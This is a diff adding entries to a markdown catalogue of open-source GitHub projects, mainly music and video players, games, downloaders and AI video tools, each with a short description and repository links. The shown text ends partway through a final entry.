@@ -8,6 +8,20 @@
 
 ---
 
+### 📦 Audiomonitorrouter
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+As soon as you move the browser window, video player or game to another screen, AudioMonitorRouter instantly redirects the sound of this program to the speakers of the exact monitor where its window is located! Windows 10.11 platform
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/kitbee/AudioMonitorRouter](https://github.com/kitbee/AudioMonitorRouter)
+- 👤 **Developer:** [kitbee](https://github.com/kitbee)
+
+
+---
+
 ### 📦 Clash Flac
 
 > **Categories:** `#Website` `#Stream` `#Flac` `#Lyrics`
@@ -17,6 +31,24 @@ ClashFLAC is a Stream high-resolution audio previews, search across millions of 
 - 🐙 **Source Code:** [https://github.com/ajisth69/clashflac](https://github.com/ajisth69/clashflac)
 - 🌐 **Official Website:** [https://clashflac.pages.dev/](https://clashflac.pages.dev/)
 - 👤 **Developer:** @letmesolo_her
+
+
+---
+
+### 📦 Bassbust straight to the body
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+An engineer under the nickname SweetestAura has released the osu-buttplug utility, which synchronizes beats and rhythm from Osu! with smart toys via Buttplug.io.
+
+The program reads the card timings via the API and translates every click, slider and clamp to the music into real vibration. Literally allows you to feel the bass and rhythm of the track 100%.
+
+Pull requests are welcome, but you will have to [test](https://github.com/atorixa/osu-lovense) the code at your own risk.
+​
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/atorixa/osu-lovense](https://github.com/atorixa/osu-lovense)
+- 👤 **Developer:** [atorixa](https://github.com/atorixa)
 
 
 ---
@@ -35,6 +67,34 @@ A simple, private, and open-source internet radio app that lets you explore cura
 
 - 🐙 **Source Code:** [https://github.com/shapeshed/aerial](https://github.com/shapeshed/aerial)
 - 👤 **Developer:** [shapeshed](https://github.com/shapeshed/)
+
+
+---
+
+### 📦 wassgha/rescript
+
+> **Categories:** `#audio` `#media` `#media_editing` `#media_editor` `#transcribe` `#transcription` `#video` `#video_editing` `#video_editor` `#video_processing`
+
+🎬 Open source, transcript-based video/audio editor that lives in the browser.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/wassgha/rescript](https://github.com/wassgha/rescript)
+- 👤 **Developer:** [wassgha](https://github.com/wassgha)
+
+
+---
+
+### 📦 yc-software/qm
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Multiplayer agent harness for work
+**Language**: TypeScript
+**Stars**: 2864 **Issues**: 37 **Forks**: 262
+[https://github.com/yc-software/qm](https://github.com/yc-software/qm)
+
+- 🐙 **Source Code:** [https://github.com/yc-software/qm](https://github.com/yc-software/qm)
+- 👤 **Developer:** [yc-software](https://github.com/yc-software)
 
 
 ---
@@ -153,6 +213,67 @@ SpatialFlow delivers a next-generation music experience on Android, blending onl
 
 ---
 
+### 📦 Openmmo
+
+> **Categories:** `#GitHub` `#OpenSource` `#rust`
+
+🔗 [https://github.com/Julian-adv/OpenMMO](https://github.com/Julian-adv/OpenMMO)
+📝 No description.
+──────────────────────────────
+
+**Introducing OpenMMO**, a groundbreaking MMORPG where AI agents and human players coexist on equal terms. This innovative game allows agents and humans to connect to the same world, abide by the same rules, and interact seamlessly with each other.
+
+__Key Features__ include:
+- `Agent-Human Parity`: No privileged API for agents, ensuring a level playing field
+- `Real-time Multiplayer`: Seamless player synchronization via WebSocket
+- `3D Environment`: Immersive quarter-view 3D game world built with Three.js
+- `Procedural World`: Fully procedurally generated world with diverse terrain, rivers, and biomes
+
+**Technical Highlights**:
+- `Rust` and `Svelte` power the server and client, respectively
+- `Three.js` and `WebGPU` enable stunning 3D graphics
+- `WebSocket` facilitates real-time communication between clients and server
+
+This project is perfect for __developers and gamers__ interested in exploring the frontiers of AI-driven gaming and collaborative game development.
+
+**Get started** by checking out the `devlog` and `documentation` for a deeper dive into the game's mechanics and development process.
+
+One-liner takeaway: OpenMMO is redefining the MMORPG landscape by empowering AI agents and human players to coexist and interact in a shared, immersive 3D world.
+
+──────────────────────────────
+🧠 **Channel: ****https://t.me/GithubRe**
+
+- 🐙 **Source Code:** [https://github.com/Julian-adv/OpenMMO](https://github.com/Julian-adv/OpenMMO)
+- 👤 **Developer:** [Julian-adv](https://github.com/Julian-adv)
+
+
+---
+
+### 📦 mesamirh/MovieBox-Tui
+
+> **Categories:** `#anime` `#moviebox` `#moviebox_api` `#streaming`
+
+A modern Rust based terminal user interface for MovieBox. Fast, lightweight, keyboard first, and cross-platform.
+**Language**: Rust
+
+- 🐙 **Source Code:** [https://github.com/mesamirh/MovieBox-Tui](https://github.com/mesamirh/MovieBox-Tui)
+- 👤 **Developer:** [mesamirh](https://github.com/mesamirh)
+
+
+---
+
+### 📦 Radioplayerv3
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/AsmSafone/RadioPlayerV3](https://github.com/AsmSafone/RadioPlayerV3)
+- 👤 **Developer:** [AsmSafone](https://github.com/AsmSafone)
+
+
+---
+
 ### 📦 Arrow Escape
 
 > **Categories:** `#android` `#game`
@@ -211,6 +332,103 @@ A beautiful, privacy-friendly offline music player with smart library management
 - lyrics read straight from the file tags (mp3, flac, m4a), supporting synced
 
 </details>
+
+
+---
+
+### 📦 Folia Major
+
+> **Categories:** `#GitHub` `#OpenSource` `#typescript` `#ai` `#music` `#music_player` `#navidrome_client` `#netease_music` `#player` `#pwa` `#react` `#vercel_deployment`
+
+🔗 [https://github.com/chthollyphile/folia-major](https://github.com/chthollyphile/folia-major)
+📝 专注于绚丽的歌词动画效果的本地音乐/navidrome/第三方网易云播放器
+──────────────────────────────
+
+**Folia** is an immersive online music player that offers a unique listening experience with its full-screen lyrics display and AI-generated theme colors. The project supports various music sources, including NetEase Cloud Music, Navidrome, and local music libraries. __Key features__ include intelligent lyrics matching, LRC file recognition, and multiple full-screen lyrics animations.
+
+To get started, users can choose from `desktop` or `web` versions, with options for `one-click deployment` to Vercel. The project is built using `Node.js` and offers a `responsive layout` that adapts to different window sizes.
+
+- 🐙 **Source Code:** [https://github.com/chthollyphile/folia-major](https://github.com/chthollyphile/folia-major)
+- 👤 **Developer:** [chthollyphile](https://github.com/chthollyphile)
+
+
+---
+
+### 📦 xxniiinxx/coinflip-casino-game
+
+> **Categories:** `#anchor` `#betting` `#blockchain_game` `#casino` `#coinflip` `#cryptocurrency` `#defi` `#fullstack` `#gambling` `#mongodb`
+
+A full-stack, peer-to-peer coinflip betting casino game on Solana. Players connect a wallet, create or join on-chain game rooms, and compete head-to-head for 2× the stake. The UI updates in real time over WebSockets, outcomes are resolved on-chain with Orao VRF, and the backend tracks rooms, chat, and match history in MongoDB.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/xxniiinxx/coinflip-casino-game](https://github.com/xxniiinxx/coinflip-casino-game)
+- 👤 **Developer:** [xxniiinxx](https://github.com/xxniiinxx)
+
+
+---
+
+### 📦 Romm
+
+> **Categories:** `#GitHub` `#OpenSource` `#python` `#emulation` `#open_source` `#retrogaming` `#rommapp` `#self_hosted`
+
+🔗 [https://github.com/rommapp/romm](https://github.com/rommapp/romm)
+📝 A beautiful, powerful, self-hosted rom manager and player.
+──────────────────────────────
+
+The **Romm** GitHub repository is home to a self-hosted __ROM manager and player__ that's both beautiful and powerful. Its main purpose is to help you __scan, enrich, browse, and play your game collection__ with a clean and responsive interface.
+
+Key features of RomM include __metadata enrichment from multiple sources__ like IGDB, Screenscraper, and MobyGames, as well as __custom artwork fetching and achievement tracking__. It supports __over 400 platforms__, and you can play games directly from your browser using EmulatorJS and RuffleRS.
+
+To get started with RomM, you can follow the `Quick Start Guide` in the documentation. The project is suitable for anyone who plays on emulators, and the community is active, with many __third-party apps and integrations available__.
+
+Technical highlights include __multi-disk game support, DLCs, mods, hacks, patches, and manuals__, as well as __tags and filtering__ for easy library management.
+
+The target audience for RomM is __gamers and retro gaming enthusiasts__ who want to organize and enjoy their game collections.
+
+Overall, RomM is a fantastic tool for anyone looking to take their retro gaming experience to the next level. So why not give it a try and discover a whole new world of gaming - __your games, organized, and at your fingertips__.
+
+──────────────────────────────
+🧠 **Channel: ****https://t.me/GithubRe**
+
+- 🐙 **Source Code:** [https://github.com/rommapp/romm](https://github.com/rommapp/romm)
+- 👤 **Developer:** [rommapp](https://github.com/rommapp)
+
+
+---
+
+### 📦 Fable Player
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/GuardionSpend/fable-player](https://github.com/GuardionSpend/fable-player)
+- 👤 **Developer:** [GuardionSpend](https://github.com/GuardionSpend)
+
+
+---
+
+### 📦 Hyperframes
+
+> **Categories:** `#GitHub` `#OpenSource` `#typescript` `#ai` `#animation` `#ffmpeg` `#framework` `#gsap` `#html` `#mcp` `#puppeteer` `#rendering` `#video`
+
+🔗 [https://github.com/heygen-com/hyperframes](https://github.com/heygen-com/hyperframes)
+📝 Write HTML. Render video. Built for agents.
+──────────────────────────────
+
+**HyperFrames** is an open-source framework that turns HTML, CSS, media, and animations into deterministic MP4 videos. It allows users to create videos by writing HTML, adding data attributes for timing and tracks, and using libraries like GSAP or CSS for seekable animation. __Key features__ include a CLI for previewing and rendering videos, a catalog of reusable blocks and components, and support for AI coding agents. `HyperFrames` can be used locally or with Docker, and it renders videos using headless Chrome and FFmpeg.
+
+The framework is __agent-friendly__, allowing coding agents to write HTML and produce videos without requiring proprietary timeline formats. It's also __deterministic__, producing the same output from the same input, making it suitable for CI and automated rendering. The `HyperFrames` stack includes a growing set of tools, including a studio for previewing and editing compositions and a community playground for sharing and rendering HTML-native video projects.
+
+**Technical highlights** include the ability to use custom animation runtimes, a non-interactive CLI by default, and no build step required for compositions. __Audience__ includes developers, designers, and content creators looking to produce high-quality videos using HTML and CSS.
+
+In summary, `HyperFrames` provides a unique approach to video creation, allowing users to write HTML and produce deterministic MP4 videos, making it an exciting tool for those looking to automate video production: __write once, render anywhere__.
+
+──────────────────────────────
+🧠 **Channel: ****https://t.me/GithubRe**
+
+- 🐙 **Source Code:** [https://github.com/heygen-com/hyperframes](https://github.com/heygen-com/hyperframes)
+- 👤 **Developer:** [heygen-com](https://github.com/heygen-com)
 
 
 ---
@@ -278,6 +496,40 @@ Ever Haptics is an Android app that adds haptic feedback across apps and system 
 
 ---
 
+### 📦 Openmontage
+
+> **Categories:** `#GitHub` `#OpenSource` `#python` `#agent` `#agentic_ai` `#ai` `#claude` `#copilot` `#cursor` `#elevenlabs` `#ffmpeg` `#flux` `#image_generation` `#open_source` `#openai` `#remotion` `#stable_diffusion` `#text_to_speech` `#text_to_video` `#video_generation` `#video_production`
+
+🔗 [https://github.com/calesthio/OpenMontage](https://github.com/calesthio/OpenMontage)
+📝 World's first open-source, agentic video production system. 12 pipelines, 52 tools, 500+ agent skills. Turn your AI coding assistant into a full video production studio.
+──────────────────────────────
+
+Welcome to **OpenMontage**, the first open-source, agentic video production system. This innovative tool allows you to create stunning videos by simply describing what you want in plain language. The agent handles research, scripting, asset generation, editing, and final composition.
+
+With __OpenMontage__, you can produce high-quality videos without extensive video production experience. The system can work with various AI coding assistants, such as Claude Code, Cursor, Copilot, Windsurf, or Codex.
+
+The key features of **OpenMontage** include:
+
+*   Starting from a reference video or a blank prompt
+*   Generating AI images, writing and narrating scripts, and finding royalty-free background music
+*   Burning in word-level subtitles and rendering the final video
+*   Supporting multiple pipelines, including image-based video and local character animation
+
+To get started, you'll need to install `Python 3.10+`, `FFmpeg`, and `Node.js 18+`. You can then clone the `OpenMontage` repository, run `make setup`, and start creating your videos.
+
+**OpenMontage** is suitable for various users, including video creators, marketers, educators, and anyone looking to produce high-quality videos without extensive production experience.
+
+In summary, __OpenMontage__ is a powerful tool that simplifies video production, making it accessible to everyone. With its agentic approach, you can create stunning videos by just describing your ideas, and the system will handle the rest. **Unlock your creativity with OpenMontage** and discover a new way of making videos.
+
+──────────────────────────────
+🧠 **Channel: ****https://t.me/GithubRe**
+
+- 🐙 **Source Code:** [https://github.com/calesthio/OpenMontage](https://github.com/calesthio/OpenMontage)
+- 👤 **Developer:** [calesthio](https://github.com/calesthio)
+
+
+---
+
 ### 📦 Flow
 
 > **Categories:** `#android` `#youtube` `#client` `#flow` `#innertube` `#ytClient` `#GitHub` `#OpenSource`
@@ -340,6 +592,22 @@ It includes FlowNeuro, a recommendation engine that runs entirely on your device
 
 ---
 
+### 📦 Skyrift Server
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Inside there are already basic online RPG systems: authorization, characters, classes, inventory, equipment, skills, effects, quests, NPCs, mobs, chat, movement, combat, teleports and world simulation.
+
+The project is divided into a persistent part and a realtime layer: the server does not just store data, but maintains the active state of the world, game sessions and processing player actions in real time.
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/Leroyalle/skyrift-server](https://github.com/Leroyalle/skyrift-server)
+- 👤 **Developer:** [Leroyalle](https://github.com/Leroyalle)
+
+
+---
+
 ### 📦 NewPipe Material
 
 > **Categories:** `#Android` `#YouTube` `#NewPipe` `#Player`
@@ -373,6 +641,32 @@ NewPipe Material is a Youtube Client which keeps the core NewPipe experience whi
 
 ---
 
+### 📦 IvanSobolev/Neo3dEngine
+
+> **Categories:** `#3d_engine` `#console_app` `#csharp` `#custom_network_protocol` `#dotnet` `#game_engine` `#game_engine_3d` `#multiplayer` `#raycasting` `#raycasting_engine` `#tcp_socket`
+
+A minimalist CPU-based 3D console engine in C# (.NET 8) built from scratch. Features Raycasting/Raytracing, dynamic lighting & shadows, .obj loader, and custom TCP-based multiplayer with real-time chat. No external graphics APIs.
+**Language**: C#
+
+- 🐙 **Source Code:** [https://github.com/IvanSobolev/Neo3dEngine](https://github.com/IvanSobolev/Neo3dEngine)
+- 👤 **Developer:** [IvanSobolev](https://github.com/IvanSobolev)
+
+
+---
+
+### 📦 osulazerdownload/osulazer
+
+> **Categories:** `#beatmap` `#osu_game` `#osu_lazer` `#osu_mania` `#osu_skin` `#osu_skins` `#osugame` `#osumania`
+
+osu mania download skin lazer map open source rhythm game windows 11 macos linux android ios mobile default client latest version 2026 download beatmaps skins custom rulesets multiplayer free
+**Language**: C#
+
+- 🐙 **Source Code:** [https://github.com/osulazerdownload/osulazer](https://github.com/osulazerdownload/osulazer)
+- 👤 **Developer:** [osulazerdownload](https://github.com/osulazerdownload)
+
+
+---
+
 ### 📦 muzik-Player
 
 > **Categories:** `#Android` `#MusicPlayer` `#OfflinePlayer` `#localFirst`
@@ -399,6 +693,50 @@ Muzik Player is a UI/UX exploration project focused on delivering a premium, gla
 
 ---
 
+### 📦 Social Auto Upload
+
+> **Categories:** `#python` `#bilibili` `#douyin` `#tiktok` `#xiaohongshu` `#youtube`
+
+This tool helps you upload videos and schedule posts to major platforms like Douyin, Bilibili, Xiaohongshu, Kuaishou, WeChat Channels, Baijiahao, and TikTok from one place. It saves you time by automating repetitive posting work, so you can manage more accounts with less manual effort and focus more on creating content.
+
+https://github.com/dreammis/social-auto-upload
+
+- 🐙 **Source Code:** [https://github.com/dreammis/social-auto-upload](https://github.com/dreammis/social-auto-upload)
+- 👤 **Developer:** [dreammis](https://github.com/dreammis)
+
+
+---
+
+### 📦 Moss Tts
+
+> **Categories:** `#python` `#audio` `#audio_tokenizer` `#llm` `#multimodal` `#text_to_speech` `#voice_cloning` `#GitHub` `#OpenSource`
+
+MOSS-TTS is an open-source family of speech and sound models for natural, high-quality audio generation, including voice cloning, multi-speaker dialogue, real-time speech, and sound effects. It supports 31 languages in v1.5, better voice stability, and pause control, and it also offers a lightweight Nano version that can run on 4 CPU cores. The benefit to you is simple: you can create realistic speech or sound for apps, demos, or products with strong quality, flexible control, and multiple ways to run it.
+
+https://github.com/OpenMOSS/MOSS-TTS
+
+- 🐙 **Source Code:** [https://github.com/OpenMOSS/MOSS-TTS](https://github.com/OpenMOSS/MOSS-TTS)
+- 👤 **Developer:** [OpenMOSS](https://github.com/OpenMOSS)
+
+
+---
+
+### 📦 yt-dlp
+
+> **Categories:** `#Utilities` `#Video` `#CLI` `#GitHub` `#OpenSource` `#python` `#sponskrub` `#sponsorblock` `#video_downloader` `#youtube_dl` `#youtube_dlc` `#youtube_downloader` `#yt_dlp` `#installation` `#output` `#Interesting`
+
+A feature-packed command-line tool to download videos and audio from YouTube, TikTok, Twitter, and 1,000+ other sites. It is faster and more capable than the original youtube-dl, with built-in SponsorBlock support, subtitle extraction, and format selection.
+
+Creator: yt-dlp
+Stars ⭐️: 163,000
+Forked by: 13,700
+
+- 🐙 **Source Code:** [https://github.com/yt-dlp/yt-dlp](https://github.com/yt-dlp/yt-dlp)
+- 👤 **Developer:** yt-dlp
+
+
+---
+
 ### 📦 looper
 
 > **Categories:** `#android` `#linux` `#looper` `#music` `#offline`
@@ -418,6 +756,20 @@ Advance music player for the linux and android with lyrics support for offline a
 - ****Robust Linux Integration**** — Complete native title-bar options, keyboard media controls, and lightweight background playback using libmpv.
 
 </details>
+
+
+---
+
+### 📦 Museeks
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+It doesn't have a ton of features because its purpose is not to compete with more feature-rich and popular music players.
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/martpie/museeks](https://github.com/martpie/museeks)
+- 👤 **Developer:** [martpie](https://github.com/martpie)
 
 
 ---
@@ -477,6 +829,33 @@ Your Spotify + YouTube Music library & daily mixes, offline in lossless FLAC. Fr
 - ****Free and open source**** — no subscriptions, no ads, GPL-3.0
 
 </details>
+
+
+---
+
+### 📦 tddworks/baguette
+
+> **Categories:** `#agent` `#apple` `#cli` `#devicefarm` `#indigohid` `#ios` `#simulator` `#simulatorkit` `#streaming`
+
+Headless iOS Simulator manager/farm + host-side input injection for iOS 26 — taps, swipes, multi-finger gestures, and 60 fps streaming
+**Language**: Swift
+
+- 🐙 **Source Code:** [https://github.com/tddworks/baguette](https://github.com/tddworks/baguette)
+- 👤 **Developer:** [tddworks](https://github.com/tddworks)
+
+
+---
+
+### 📦 Nethack
+
+> **Categories:** `#c_lang` `#c` `#game` `#roguelike`
+
+NetHack 5.0.0 is an updated dungeon exploration game that improves on previous versions with better code quality, easier cross-platform building, and new features like automatic annotations for key locations. The update uses modern C99 programming standards and replaces older compilation tools with faster Lua-based alternatives that work during gameplay. Players benefit from a more stable, efficient game that runs smoothly across different computers and operating systems, plus new gameplay enhancements that make exploration clearer and more enjoyable.
+
+https://github.com/NetHack/NetHack
+
+- 🐙 **Source Code:** [https://github.com/NetHack/NetHack](https://github.com/NetHack/NetHack)
+- 👤 **Developer:** [NetHack](https://github.com/NetHack)
 
 
 ---
@@ -551,6 +930,20 @@ a solo-built anime and movie application for Android. While based on the Aniyomi
 
 ---
 
+### 📦 MrsEWE44/musicDownload
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+**Language**: Python
+**Stars**: 556 **Issues**: 2 **Forks**: 70
+[https://github.com/MrsEWE44/musicDownload](https://github.com/MrsEWE44/musicDownload)
+
+- 🐙 **Source Code:** [https://github.com/MrsEWE44/musicDownload](https://github.com/MrsEWE44/musicDownload)
+- 👤 **Developer:** [MrsEWE44](https://github.com/MrsEWE44)
+
+
+---
+
 ### 📦 Better Nothing Music Visualizer
 
 > **Categories:** `#NothingOS` `#Glyph` `#Visualizer` `#Android` `#FOSS`
@@ -569,6 +962,34 @@ A powerful upgrade for Nothing Phone users that transforms the Glyph Interface i
 
 ---
 
+### 📦 Pixelle Video
+
+> **Categories:** `#python` `#aigc` `#comfyui` `#image_generation` `#tts` `#video_generation` `#GitHub` `#OpenSource`
+
+Pixelle-Video is an AI tool that fully automates short video creation: input a theme, and it writes scripts, generates images/videos, adds voiceovers, music, and compiles the final clip—no editing skills needed. Recent updates include action transfer, multi-language TTS, and custom uploads for personalized results. Download the Windows package or install via source for easy web use with free local options. You benefit by quickly making pro videos for social media or content, saving hours of manual work and costs.
+
+https://github.com/AIDC-AI/Pixelle-Video
+
+- 🐙 **Source Code:** [https://github.com/AIDC-AI/Pixelle-Video](https://github.com/AIDC-AI/Pixelle-Video)
+- 👤 **Developer:** [AIDC-AI](https://github.com/AIDC-AI)
+
+
+---
+
+### 📦 Ytlite
+
+> **Categories:** `#logos` `#downloader` `#ios` `#jailbreak` `#sponsorblock` `#tweak` `#youtube`
+
+YouTube Plus enhances the iOS YouTube app with over 100 options like downloading videos/audio/thumbnails, copying info, customizing interfaces (remove feeds, OLED mode), player gestures, built-in SponsorBlock, and tweaks for 4K, PiP, dislikes, and quality selector. Build your custom version via GitHub Actions using a decrypted YouTube IPA—fork the repo, run the workflow, select tweaks, and download from releases (last free v5.2b4). This gives you a tailored, ad-free experience with premium features for better viewing and saving content.
+
+https://github.com/dayanch96/YTLite
+
+- 🐙 **Source Code:** [https://github.com/dayanch96/YTLite](https://github.com/dayanch96/YTLite)
+- 👤 **Developer:** [dayanch96](https://github.com/dayanch96)
+
+
+---
+
 ### 📦 LastWave
 
 > **Categories:** `#Android` `#Music` `#lastfm`
@@ -578,6 +999,20 @@ A clean and powerful playlist generator built around your listening habits. Gene
 
 - 🐙 **Source Code:** [https://github.com/AmanRajAryan/LastWave](https://github.com/AmanRajAryan/LastWave)
 - 👤 **Developer:** [AmanRajAryan](https://github.com/AmanRajAryan/)
+
+
+---
+
+### 📦 Android Foss
+
+> **Categories:** `#python` `#android` `#android_apps` `#f_droid` `#foss` `#free_and_op` `#free_and_open_source` `#izzyondroid` `#open_source` `#opensource` `#GitHub`
+
+This list offers free open-source Android apps for every need—from browsers, cameras, and music players to games, tools, and F-Droid stores like Neo-Store. Get them via F-Droid or IzzyOnDroid for no ads or tracking. It boosts your privacy and freedom by ditching Google apps, letting you control your data and phone fully.
+
+https://github.com/offa/android-foss
+
+- 🐙 **Source Code:** [https://github.com/offa/android-foss](https://github.com/offa/android-foss)
+- 👤 **Developer:** [offa](https://github.com/offa)
 
 
 ---
@@ -635,6 +1070,65 @@ Override Android's default volume steps with custom step counts. Includes 6000+ 
 
 ---
 
+### 📦 Foobox Cn
+
+> **Categories:** `#javascript` `#GitHub` `#OpenSource`
+
+foobox is a sleek, customizable skin for foobar2000 music player that uses JSplitter for smooth layouts, lyrics, spectrum analyzer, playlists, covers, search, and online radio. Download the free Chinese version package from latest Releases—it works on 32/64-bit, installs green without the base app, and lets you switch layouts via Main Menu > View > Layout > Quick Setup. You get a modern, feature-rich interface that runs fast, giving full control over your music library for better listening.
+
+https://github.com/dream7180/foobox-cn
+
+- 🐙 **Source Code:** [https://github.com/dream7180/foobox-cn](https://github.com/dream7180/foobox-cn)
+- 👤 **Developer:** [dream7180](https://github.com/dream7180)
+
+
+---
+
+### 📦 Gamdl
+
+> **Categories:** `#python` `#4k` `#aac` `#apple_music` `#apple_music_downloader` `#downloader` `#m4a` `#m4v` `#GitHub` `#OpenSource`
+
+Gamdl is a free command-line tool to download Apple Music songs in high-quality AAC 256kbps, music videos up to 4K, albums, playlists, and artist content, with synced lyrics (LRC/SRT), rich metadata, and cover art. Install via `pip install gamdl`, add your browser cookies from an active subscription, and run `gamdl [URL]`. It benefits you by letting you enjoy offline playback anywhere without streaming data costs, on any device, with organized files ready for your library.
+
+https://github.com/glomatico/gamdl
+
+- 🐙 **Source Code:** [https://github.com/glomatico/gamdl](https://github.com/glomatico/gamdl)
+- 👤 **Developer:** [glomatico](https://github.com/glomatico)
+
+
+---
+
+### 📦 pathway
+
+> **Categories:** `#GitHub` `#OpenSource` `#readme` `#python` `#rust` `#streaming` `#real_time` `#kafka` `#etl` `#machine_learning_algorithms` `#stream_processing` `#data_analytics` `#dataflow` `#data_processing` `#data_pipelines` `#batch_processing` `#pathway` `#iot_analytics` `#etl_framework` `#time_series_analysis`
+
+Python ETL framework for stream processing, real-time analytics, LLM pipelines, and RAG.
+
+Creator:   pathwaycom
+Stars ⭐️:  56556
+Forked by:  1545
+
+- 🐙 **Source Code:** [https://github.com/pathwaycom/pathway](https://github.com/pathwaycom/pathway)
+- 🌐 **Official Website:** [https://pathway.com](https://pathway.com)
+- 👤 **Developer:** pathwaycom
+
+
+---
+
+### 📦 Widelands
+
+> **Categories:** `#cplusplus` `#apple_silicon` `#bsd` `#c_plus_plus` `#cmake` `#floss` `#game` `#gplv2` `#json` `#linux` `#lua` `#macos_app` `#python` `#strategy` `#windows` `#GitHub` `#OpenSource`
+
+Widelands is a free, open-source real-time strategy game like Settlers II, where you lead a small clan to build roads, gather resources like wood and gold, manage four unique tribes, trade, or fight in single-player campaigns and multiplayer. Download it easily for Windows, Mac, or Linux, or compile from source with simple scripts and tools like CMake on various systems. This lets you enjoy deep, replayable empire-building fun at no cost, anytime with friends or AI.
+
+https://github.com/widelands/widelands
+
+- 🐙 **Source Code:** [https://github.com/widelands/widelands](https://github.com/widelands/widelands)
+- 👤 **Developer:** [widelands](https://github.com/widelands)
+
+
+---
+
 ### 📦 ClassiPod
 
 > **Categories:** `#Android` `#MusicPlayer` `#OfflinePlayer`
@@ -683,6 +1177,21 @@ A local music player app designed to capture the essence of the iPod Classic.
 
 ---
 
+### 📦 LCEMP/LCEMP
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+A fork of minecraft LCE with LAN multiplayer support and other fixes.
+**Language**: C++
+**Stars**: 703 **Issues**: 49 **Forks**: 94
+[https://github.com/LCEMP/LCEMP](https://github.com/LCEMP/LCEMP)
+
+- 🐙 **Source Code:** [https://github.com/LCEMP/LCEMP](https://github.com/LCEMP/LCEMP)
+- 👤 **Developer:** [LCEMP](https://github.com/LCEMP)
+
+
+---
+
 ### 📦 Lossless Cut
 
 > **Categories:** `#Video` `#Editor` `#Windows` `#Linux` `#MacOS` `#GitHub` `#OpenSource`
@@ -725,6 +1234,57 @@ A dynamic, elegant, and highly customizable music widget for GNOME Shell. It bri
 
 ---
 
+### 📦 Chibi
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+One bot - dozens of models: GPT, Claude, Gemini, DeepSeek, Grok, Qwen, Kimi, MiniMax, ZhipuAI and others. He decides which provider to use for the task. Writes and reviews code, runs tests, does research, generates pictures and music.
+
+Can spawn sub-agents and work in parallel with you in the background. Extensible via MCP: GitHub, browser, databases, Docker. Self-hosted - your own keys, your own server, no vendor lock-in.
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/s-nagaev/chibi](https://github.com/s-nagaev/chibi)
+- 👤 **Developer:** [s-nagaev](https://github.com/s-nagaev)
+
+
+---
+
+### 📦 Zerobot Plugin
+
+> **Categories:** `#go` `#coolq` `#cqhttp` `#cqhttp_mirai` `#go_cqhttp` `#golang` `#group_manager` `#mirai` `#mirai_bot` `#nonebot` `#onebot` `#onebot_plugin` `#onebot_sdk` `#plugin` `#qq` `#qq_bot` `#qqbot` `#qqrobot` `#websocket` `#zerobot`
+
+ZeroBot-Plugin is a comprehensive utility plugin collection for the ZeroBot chatbot framework, offering over 100 features across entertainment, management, and productivity categories. The system provides high-priority functions like chat management, sleep tracking, and group administration, alongside mid-tier features such as image generation, music streaming, and game simulations. Users benefit from flexible plugin control—enabling or disabling specific features per group—and dynamic loading capabilities that reduce program size. The platform supports multiple deployment methods, from pre-compiled releases to local compilation, making it accessible whether you prefer ready-to-use binaries or customized builds. With extensive command options, scheduled task triggers, and AI integration, ZeroBot-Plugin transforms group chat management into an automated, entertaining experience while maintaining user control over which features activate in specific communities.
+
+https://github.com/FloatTech/ZeroBot-Plugin
+
+- 🐙 **Source Code:** [https://github.com/FloatTech/ZeroBot-Plugin](https://github.com/FloatTech/ZeroBot-Plugin)
+- 👤 **Developer:** [FloatTech](https://github.com/FloatTech)
+
+
+---
+
+### 📦 Bettermodel
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+It implements fully server-side 3D models using a package of item display entities.
+
+— Import Generic BlockBench .bbmodel model
+— Auto-generation of a resource package
+— Play animation
+— Synchronization with the base entity
+- Custom hit block
+— Player animation with 12 limbs
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/toxicity188/BetterModel](https://github.com/toxicity188/BetterModel)
+- 👤 **Developer:** [toxicity188](https://github.com/toxicity188)
+
+
+---
+
 ### 📦 Astronia
 
 > **Categories:** `#Android` `#Player`
@@ -746,6 +1306,33 @@ Astronia is a lightweight and modern M3U8 video player for Android.
 - Multi-language support (30+)
 
 </details>
+
+
+---
+
+### 📦 f/textream
+
+> **Categories:** `#macos` `#macos_app` `#streaming`
+
+Textream is a free macOS teleprompter app for streamers, interviewers, and presenters. It highlights your script in real-time as you speak, displayed in a beautiful Dynamic Island overlay.
+**Language**: Swift
+
+- 🐙 **Source Code:** [https://github.com/f/textream](https://github.com/f/textream)
+- 👤 **Developer:** [f](https://github.com/f)
+
+
+---
+
+### 📦 fspecii/ace-step-ui
+
+> **Categories:** `#ace_step` `#ai` `#ai_music` `#local_first` `#music` `#music_generation` `#open_source` `#react` `#suno_alternative` `#typescript` `#readme` `#javascript`
+
+🎵 The Ultimate Open Source Suno Alternative - Professional UI for ACE-Step 1.5 AI Music Generation. Free, local, unlimited. Stop paying for Suno!
+**Language**: JavaScript
+
+- 🐙 **Source Code:** [https://github.com/fspecii/ace-step-ui](https://github.com/fspecii/ace-step-ui)
+- 🌐 **Official Website:** [https://github.com/fspecii/ace-step-ui#readme](https://github.com/fspecii/ace-step-ui#readme)
+- 👤 **Developer:** [fspecii](https://github.com/fspecii)
 
 
 ---
@@ -866,6 +1453,19 @@ Your go-to Android app for downloading videos & audio from YouTube, Instagram, T
 
 ---
 
+### 📦 mvanhorn/last30days-skill
+
